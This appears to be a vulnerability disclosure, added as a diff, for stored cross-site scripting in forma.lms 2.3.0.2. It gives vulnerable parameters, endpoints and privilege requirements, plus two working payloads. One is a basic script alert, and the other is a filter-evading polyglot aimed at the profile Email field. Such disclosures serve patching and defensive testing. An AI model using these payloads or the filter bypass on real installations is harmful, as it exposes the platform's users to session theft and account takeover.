@@ -1,0 +1,25 @@
+# Exploit Title: forma.lms The E-Learning Suite 2.3.0.2 - Persistent Cross-Site Scripting 
+# Date: 2020-05-15
+# Exploit Author: Daniel Ortiz
+# Vendor Homepage: https://sourceforge.net/projects/forma/
+# Software link: https://sourceforge.net/projects/forma/files/latest/download
+# Tested on:  XAMPP for Linux 64bit 5.6.40-0
+
+
+
+## 1 -Course Module
+- Vulnerable parameter: course_code, course_name, course_box_descr, course_descr
+- Payload: <SCRIPT>alert('XSS');</SCRIPT>
+- Details: There is no control or security mechanism on this field. Specials characters are not encoded or filtered.
+- Privileges: It requires admin.
+- Location: Admin Area > E-learning > Courses > Courses > Edit Course
+- Endopoint: /formalms/appCore/index.php?r=alms/course/modcourse
+
+
+## 1 -Profile Module
+- Vulnerable parameter: Email
+- Payload: <div>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onmouseover=alert('xss') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</div>
+- Details: There is some control on this field but can bypassed.
+- Privileges: Do not requires admin or student account.
+- Location: My Profile > Edit > Put the payload in Email field.
+- Endpoint: /formalms/appLms/index.php?r=lms/profile/show&ap=saveinfo
